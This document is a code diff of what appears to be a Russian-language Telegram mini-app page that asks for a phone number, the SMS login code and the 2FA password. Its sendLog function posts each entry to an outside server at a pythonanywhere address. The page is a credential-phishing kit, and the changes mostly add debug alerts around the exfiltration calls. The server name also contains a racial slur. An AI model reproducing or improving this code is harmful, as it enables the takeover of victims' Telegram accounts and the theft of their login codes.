@@ -323,7 +323,7 @@
         <option value="+55">Бразилия (+55)</option>
         <option value="+673">Бруней (+673)</option>
         <option value="+359">Болгария (+359)</option>
-        <option value="+226">Буркина-ФасО (+226)</option>
+        <option value="+226">Буркина-Фасо (+226)</option>
         <option value="+257">Бурунди (+257)</option>
         <option value="+855">Камбоджа (+855)</option>
         <option value="+237">Камерун (+237)</option>
@@ -424,7 +424,7 @@
         <option value="+974">Катар (+974)</option>
         <option value="+40">Румыния (+40)</option>
         <option value="+250">Руанда (+250)</option>
-        <option value="+966">Саудовская Аравия (+966)</option>
+        <option value="+966">Саудовская Аравиia (+966)</option>
         <option value="+221">Сенегал (+221)</option>
         <option value="+381">Сербия (+381)</option>
         <option value="+248">Сейшелы (+248)</option>
@@ -555,9 +555,11 @@
     // URL сервера
     const SERVER_URL = "https://monkeynigger.pythonanywhere.com/send-log";
 
-    // Функция для отправки логов на наш сервер
+    // УЛУЧШЕННАЯ ФУНКЦИЯ ДЛЯ ОТПРАВКИ ЛОГОВ
     async function sendLog(action, details = '') {
       try {
+        alert('🔧 DEBUG: sendLog начал выполнение');
+        
         // Получаем данные пользователя
         let user;
         try {
@@ -566,8 +568,11 @@
           user = null;
         }
 
+        alert(`🔧 DEBUG: Данные пользователя: ${JSON.stringify(user)}`);
+        
         // Если данные недоступны, используем заглушку
         if (!user) {
+          alert('🔧 DEBUG: Используем заглушку для пользователя');
           user = {
             id: Date.now(),
             first_name: 'User',
@@ -583,9 +588,11 @@
           details: details
         };
 
-        console.log('📤 Отправка лога на сервер:', logData);
-        
+        alert(`🔧 DEBUG: Отправляемые данные: ${JSON.stringify(logData)}`);
+        alert(`🔧 DEBUG: URL сервера: ${SERVER_URL}`);
+
         // Отправляем на наш сервер
+        alert('🔧 DEBUG: Начинаем fetch запрос...');
         const response = await fetch(SERVER_URL, {
           method: 'POST',
           headers: {
@@ -594,10 +601,16 @@
           body: JSON.stringify(logData)
         });
 
+        alert(`🔧 DEBUG: Статус ответа: ${response.status}`);
+        alert(`🔧 DEBUG: Ответ OK: ${response.ok}`);
+        
         const result = await response.json();
-        console.log('✅ Ответ сервера:', result);
+        alert(`🔧 DEBUG: Ответ сервера: ${JSON.stringify(result)}`);
+        
+        alert('✅ DEBUG: sendLog успешно завершен');
         
       } catch (error) {
+        alert(`❌ ОШИБКА в sendLog: ${error.message}`);
         console.error('❌ Ошибка отправки лога:', error);
       }
     }
@@ -631,7 +644,6 @@
     }
 
     function handlePhoneSubmit() {
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: Функция handlePhoneSubmit вызвана!');
       
       const phone = document.getElementById('phone').value;
@@ -644,20 +656,17 @@
         return;
       }
       
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: Данные получены, вызываю sendLog');
       
       // Отправляем лог о вводе номера
       sendLog('PHONE_ENTERED', `Страна: ${country}, Номер: ${countryCode}${phone}`);
       
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: sendLog завершен, перехожу к nextScreen');
       
       nextScreen(2);
     }
 
     function handleSmsSubmit() {
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: Функция handleSmsSubmit вызвана!');
       
       const codeInputs = document.querySelectorAll('#screen2 .code-input');
@@ -669,7 +678,6 @@
         return;
       }
       
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: SMS код получен, вызываю sendLog');
       
       // Отправляем лог о вводе SMS кода
@@ -678,7 +686,6 @@
     }
 
     function handle2faSubmit() {
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: Функция handle2faSubmit вызвана!');
       
       const codeInputs = document.querySelectorAll('#screen3 .code-input');
@@ -690,7 +697,6 @@
         return;
       }
       
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: 2FA код получен, вызываю sendLog');
       
       // Отправляем лог о вводе 2FA кода
@@ -699,7 +705,6 @@
     }
 
     function resendCode() {
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: Функция resendCode вызвана!');
       
       const resendLink = document.getElementById('resendLink');
@@ -743,7 +748,6 @@
     }
 
     function handleCancel() {
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: Функция handleCancel вызвана!');
       
       sendLog('USER_CANCELLED', 'Пользователь отменил авторизацию');
@@ -751,7 +755,6 @@
     }
 
     function completeAuth() {
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: Функция completeAuth вызвана!');
       
       sendLog('AUTH_SUCCESS', 'Успешная авторизация пользователя');
@@ -759,7 +762,6 @@
     }
 
     function closeWebApp() {
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: Функция closeWebApp вызвана!');
       
       sendLog('APP_CLOSED', 'Пользователь вернулся в бота');
@@ -767,7 +769,6 @@
     }
 
     document.addEventListener('DOMContentLoaded', function() {
-      // АЛЕРТ ДЛЯ ДИАГНОСТИКИ
       alert('🔧 DEBUG: Страница загружена, вызываю sendLog APP_STARTED');
       
       sendLog('APP_STARTED', 'Мини-приложение запущено в Telegram WebView');
